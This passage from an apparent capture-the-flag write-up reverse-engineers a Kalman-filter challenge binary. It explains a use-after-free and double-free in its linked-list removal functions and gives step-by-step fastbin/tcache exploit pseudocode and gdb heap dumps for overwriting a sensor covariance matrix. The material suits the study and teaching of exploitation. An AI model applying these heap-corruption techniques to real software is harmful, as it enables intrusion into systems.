</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>PositionUpdate</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>vtable</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>_BYTE</span> <span class=n>pad</span><span class=p>[</span><span class=mi>40</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>_BYTE</span> <span class=n>matrix</span><span class=p>[</span><span class=mi>144</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>double</span> <span class=o>*</span><span class=n>variance_arr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>_BYTE</span> <span class=n>pad2</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>Link</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>PositionMeasurement</span> <span class=n>pos</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>Link</span> <span class=o>*</span><span class=n>prev</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>Link</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>LinkedList</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Link</span> <span class=o>*</span><span class=n>head</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Link</span> <span class=o>*</span><span class=n>tail</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>User</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>PositionUpdate</span> <span class=n>pos_update</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>LinkedList</span> <span class=n>linked_list</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>_BYTE</span> <span class=n>measurements_vec</span><span class=p>[</span><span class=mi>40</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><h4 class="relative group">Functionalities implemented in the binary<div id=functionalities-implemented-in-the-binary class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#functionalities-implemented-in-the-binary aria-label=Anchor>#</a></span></h4><p>When the binary is started we are greeted with the following menu:</p><pre tabindex=0><code>1: Add measurement
2: Remove first measurement
3: Remove last measurement
4: List measurements
5: Run simulation
Choice&gt;
</code></pre><p>Internally a struct <code>User</code> is created, this will be used throughout the program:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=n>User</span><span class=o>::</span><span class=nf>User</span><span class=p>(</span><span class=o>&amp;</span><span class=n>user</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=n>User</span><span class=o>::</span><span class=nf>User</span><span class=p>(</span><span class=n>User</span> <span class=o>*</span><span class=n>this</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>PositionUpdate</span><span class=o>::</span><span class=nf>PositionUpdate</span><span class=p>(</span><span class=o>&amp;</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>pos_update</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>LinkedList</span><span class=o>&lt;</span><span class=n>PositionMeasurement</span><span class=o>&gt;::</span><span class=nf>LinkedList</span><span class=p>(</span><span class=o>&amp;</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>linked_list</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>vector</span><span class=o>&lt;</span><span class=n>AccelerationMeasurement</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=n>AccelerationMeasurement</span><span class=o>&gt;&gt;::</span><span class=nf>vector</span><span class=p>(</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>measurements_vec</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>User</span><span class=o>::</span><span class=nf>loadAccels</span><span class=p>(</span><span class=n>this</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>User</span><span class=o>::</span><span class=nf>loadPositions</span><span class=p>(</span><span class=n>this</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>PositionUpdate</span><span class=o>::</span><span class=nf>setVariance</span><span class=p>(</span><span class=o>&amp;</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>pos_update</span><span class=p>,</span> <span class=mf>100.0</span><span class=p>,</span> <span class=mf>100.0</span><span class=p>,</span> <span class=mf>100.0</span><span class=p>,</span> <span class=mf>10.0</span><span class=p>,</span> <span class=mf>10.0</span><span class=p>,</span> <span class=mf>10.0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h5 class="relative group"><code>1: Add measurement</code><div id=1-add-measurement class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#1-add-measurement aria-label=Anchor>#</a></span></h5><p>When we add a measurement we are asked for X,Y,Z and the time:</p><pre tabindex=0><code>1: Add measurement
2: Remove first measurement
3: Remove last measurement
4: List measurements
5: Run simulation
Choice&gt;
1
Enter new measurement. X,Y,Z are uint64 fixed point numbers. Time is usec counts.
Time (US)&gt;
10
X&gt;
20
Y&gt;
30
Z&gt;
40
</code></pre><p>From these values a <code>PositionMeasurement</code> struct is created and then added to the linked list <code>linked_list</code> of the user struct.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>User</span><span class=o>::</span><span class=nf>addMeasurement</span><span class=p>(</span><span class=n>User</span> <span class=o>*</span><span class=n>this</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=n>LinkedList</span><span class=o>&lt;</span><span class=n>PositionMeasurement</span><span class=o>&gt;::</span><span class=nf>addBack</span><span class=p>(</span><span class=o>&amp;</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>linked_list</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>measurement</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h5 class="relative group"><code>2: Remove first measurement</code><div id=2-remove-first-measurement class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#2-remove-first-measurement aria-label=Anchor>#</a></span></h5><p>Option 2 allows us to remove the first element from the head of the linked list (<code>linked_list</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=n>LinkedList</span><span class=o>&lt;</span><span class=n>PositionMeasurement</span><span class=o>&gt;::</span><span class=nf>popFront</span><span class=p>(</span><span class=n>LinkedList</span> <span class=o>*</span><span class=n>list</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Link</span> <span class=o>*</span><span class=n>head</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>head</span> <span class=o>=</span> <span class=n>list</span><span class=o>-&gt;</span><span class=n>head</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>list</span><span class=o>-&gt;</span><span class=n>head</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>list</span><span class=o>-&gt;</span><span class=n>head</span> <span class=o>=</span> <span class=n>list</span><span class=o>-&gt;</span><span class=n>head</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>list</span><span class=o>-&gt;</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>list</span><span class=o>-&gt;</span><span class=n>head</span><span class=o>-&gt;</span><span class=n>prev</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>operator</span> <span class=nf>delete</span><span class=p>(</span><span class=n>head</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h5 class="relative group"><code>3: Remove last measurement</code><div id=3-remove-last-measurement class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#3-remove-last-measurement aria-label=Anchor>#</a></span></h5><p>Option 3 allows us to remove the first element from the tail of the linked list (<code>linked_list</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=n>LinkedList</span><span class=o>&lt;</span><span class=n>PositionMeasurement</span><span class=o>&gt;::</span><span class=nf>popBack</span><span class=p>(</span><span class=n>LinkedList</span> <span class=o>*</span><span class=n>list</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Link</span> <span class=o>*</span><span class=n>cur</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>cur</span> <span class=o>=</span> <span class=n>list</span><span class=o>-&gt;</span><span class=n>tail</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>cur</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>list</span><span class=o>-&gt;</span><span class=n>tail</span> <span class=o>=</span> <span class=n>list</span><span class=o>-&gt;</span><span class=n>tail</span><span class=o>-&gt;</span><span class=n>prev</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>list</span><span class=o>-&gt;</span><span class=n>tail</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>list</span><span class=o>-&gt;</span><span class=n>tail</span><span class=o>-&gt;</span><span class=n>next</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>cur</span><span class=o>-&gt;</span><span class=n>next</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>cur</span><span class=o>-&gt;</span><span class=n>prev</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>cur</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>operator</span> <span class=nf>delete</span><span class=p>(</span><span class=n>cur</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h5 class="relative group"><code>4: List measurements</code><div id=4-list-measurements class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#4-list-measurements aria-label=Anchor>#</a></span></h5><p>Option 4 allows us to list all the measurements and print their values (time, x, y, z).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=n>User</span><span class=o>::</span><span class=nf>listMeasurement</span><span class=p>(</span><span class=n>User</span> <span class=o>*</span><span class=n>this</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>bool</span> <span class=n>is_not_null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Link</span> <span class=o>*</span><span class=n>pos_measurement</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>is_not_null</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34; Time (us), X, Y, Z&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=n>is_not_null</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>pos_measurement</span> <span class=o>=</span> <span class=n>LinkedList</span><span class=o>&lt;</span><span class=n>PositionMeasurement</span><span class=o>&gt;::</span><span class=nf>getIndex</span><span class=p>(</span><span class=o>&amp;</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>linked_list</span><span class=p>,</span> <span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>pos_measurement</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>User</span><span class=o>::</span><span class=nf>printMeasurment</span><span class=p>(</span><span class=n>this</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pos_measurement</span><span class=o>-&gt;</span><span class=n>pos</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>++</span><span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>is_not_null</span> <span class=o>=</span> <span class=p>(</span><span class=n>pos_measurement</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h4 class="relative group">Kalman Filters Explained<div id=kalman-filters-explained class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#kalman-filters-explained aria-label=Anchor>#</a></span></h4><p>Kalman filters are used to estimate the position of an object, combining the
effect of measurements by sensors and the commands that are given to actuators.
In this case, the filter receives information from two sources: acceleration
readings and position readings. The accelerations are constant between
executions and we have no control over them. On the other hand, we can influence
the state of the kalman filter as we have control on the position readings.</p><p>Both positions and accelerations are three-dimensional with an associated
timestamp. The simulation loop steps forward in time from one acceleration
reading to the next, terminating after they are finished. Before applying the
effect of the acceleration, the program checks if the next position in the list
of readings has a timestamp lower than the acceleration that is about to be
processed, in that case, the state of the filter is updated with the information
provided by the positional reading, then propagated to the timestamp of the
acceleration. At that point, the acceleration is applied to the filter and the
simulation continues.</p><p>As we have control on the positional readings, we can feed fake measurements to
the filter to bring the estimate close to the station, however, the accuracy of
the sensor is too low to allow us to steer the estimate to the position we need
with sufficient accuracy (the magnitude of the covariance matrix describing the
sensor is too high)</p><h4 class="relative group">Vulnerability<div id=vulnerability class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#vulnerability aria-label=Anchor>#</a></span></h4><p>The struct <code>LinkedList linked_list</code> holds a pointer to the head and the tail of
the linked list. When using option 2 and 3 the elements of the linked lists are
freed and removed starting from the head or the tail. When the list only
contains one element, <code>head</code> and <code>tail</code> both point to the same <code>Link</code> struct.
When removing the head or the tail from such linked list the other pointer is
not updated and this will later cause a uaf/double free.</p><p>Example:</p><pre tabindex=0><code>head = A
tail = A
</code></pre><p>If now we pop from the front:</p><pre tabindex=0><code>head = NULL
tail = A
</code></pre><p>tail now points to a freed <code>Link</code> struct. (a pop back now would cause a double free).</p><p>Similarly if we pop from the back:</p><pre tabindex=0><code>head = A
tail = NULL
</code></pre><p>head now points to a freed <code>Link</code> struct (a pop front now would cause a double free).</p><p>When printing the linked list the list is walked starting from the head pointer,
so to get an info leak we want this case:</p><pre tabindex=0><code>head = A
tail = NULL
</code></pre><p>Using these primitives we used a fastbin attack to obtain an arbitrary write on the heap</p><h4 class="relative group">Fastbin attack pseudocode<div id=fastbin-attack-pseudocode class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#fastbin-attack-pseudocode aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># The list initially has 11 elements</span>
</span></span><span class=line><span class=cl><span class=c1># remove them all starting from the tail of the linked list</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>11</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>remove_last_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># At this point the head pointer is freed, we can get an heap leak</span>
</span></span><span class=line><span class=cl><span class=n>heap_leak</span> <span class=o>=</span> <span class=n>list_measurements</span><span class=p>()[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># This add will overewrite the UAFd head,</span>
</span></span><span class=line><span class=cl><span class=c1># fixing the list</span>
</span></span><span class=line><span class=cl><span class=n>add_measurement</span><span class=p>(</span><span class=mh>0x1337</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># List : A &lt;-&gt; A, and 6 elements in 0x40 tcache</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Drain tcache</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add_measurement</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x41</span><span class=o>+</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Fill tcache</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>remove_last_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># List: A &lt;-&gt; A, and 0x40 tcache is full</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>remove_first_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># List: NULL &lt;-&gt; A (free)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add_measurement</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x41</span><span class=o>+</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># now 0x40 tcache is empty</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add_measurement</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x41</span><span class=o>+</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># List: NULL &lt;-&gt; A &lt;-&gt; ... (7) ... &lt;-&gt; A</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add_measurement</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x41</span><span class=o>+</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># List: NULL &lt;-&gt; A &lt;-&gt; ... (7) ... &lt;-&gt; A &lt;-&gt; ... (7)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>remove_last_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># List: NULL &lt;-&gt; A &lt;-&gt; ... (7) ... &lt;-&gt; A, and tcache 0x40 is full</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>remove_last_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># NULL &lt;-&gt; A (free) &lt;-&gt; ... (7) ...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>remove_last_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># NULL &lt;-&gt; A (free)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>remove_last_measurement</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># double free fastbin A</span>
</span></span><span class=line><span class=cl><span class=c1># NULL &lt;-&gt; NULL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add_measurement</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x41</span><span class=o>+</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># drain tcache 0x40</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Allocate A, overwrite its next pointer</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=mh>0x4141414141414141</span>
</span></span><span class=line><span class=cl><span class=n>add_measurement</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># consume tcache so we can consume fastbins</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add_measurement</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;X&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Z&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Consume 1 pad chunk from fastbin</span>
</span></span><span class=line><span class=cl><span class=n>add_measurement</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=c1># pad</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># next 0x40 fastbin alloc will end up at 0x4141414141414141</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># pwndbg&gt; bins</span>
</span></span><span class=line><span class=cl><span class=c1># ...</span>
</span></span><span class=line><span class=cl><span class=c1># fastbins</span>
</span></span><span class=line><span class=cl><span class=c1># 0x20: 0x0</span>
</span></span><span class=line><span class=cl><span class=c1># 0x30: 0x0</span>
</span></span><span class=line><span class=cl><span class=c1># 0x40: 0x4141414141414141 (&#39;AAAAAAAA&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1># 0x50: 0x0</span>
</span></span><span class=line><span class=cl><span class=c1># 0x60: 0x0</span>
</span></span><span class=line><span class=cl><span class=c1># 0x70: 0x0</span>
</span></span><span class=line><span class=cl><span class=c1># 0x80: 0x0</span>
</span></span><span class=line><span class=cl><span class=c1># ...</span>
</span></span></code></pre></div><h4 class="relative group">Pwning the Kalman Filter<div id=pwning-the-kalman-filter class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#pwning-the-kalman-filter aria-label=Anchor>#</a></span></h4><p>Now that we have control over the forward pointer of the 0x40 fastbin, the next
step is to determine which pointer to place there. As explained earlier, we have
control over the positional readings, but the sensor is not accurate enough, so
we can use the vulnerability to alter the accuracy characteristic of the sensor
to give more weights to our measures.</p><p>During the challenge startup, the <code>User::User()</code> constructor initializes the <code>variance_arr</code> array of doubles for the <code>PositionUpdate</code> object associated with the user. This array is the covariance matrix of the position sensor.</p><p>This matrix is initialized to</p><p>\begin{matrix} 100 & 10 & 10 \ 10 & 100 & 10 \ 10 & 10 & 100 \end{matrix}</p><p>by the <code>PositionUpdate::setVariance</code> method, called inside <code>User::User()</code>.</p><p>After inserting a breakpoint into <code>PositionUpdate::setVariance</code>, we observe that the covariance matrix is stored in the heap and initialized before the simulation and it&rsquo;s never modified after that. With the base address of the heap already leaked, we can calculate the memory address of the covariance matrix and place it in the 0x40 fastbin.</p><p>After initializing the covariance matrix, it is possible to inspect the memory using gdb to obtain the layout of the chunk where it is stored.</p><pre tabindex=0><code>heap_base + 0x11e90: 0x0000000000000000      0x0000000000000000
heap_base + 0x11ea0: 0x0000000000000000      0x0000000000000041
heap_base + 0x11eb0: 0x4059000000000000      0x4059000000000000
heap_base + 0x11ec0: 0x4059000000000000      0x4024000000000000
heap_base + 0x11ed0: 0x4024000000000000      0x4024000000000000
heap_base + 0x11ee0: 0x0000000000000000      0x00000000000001e1
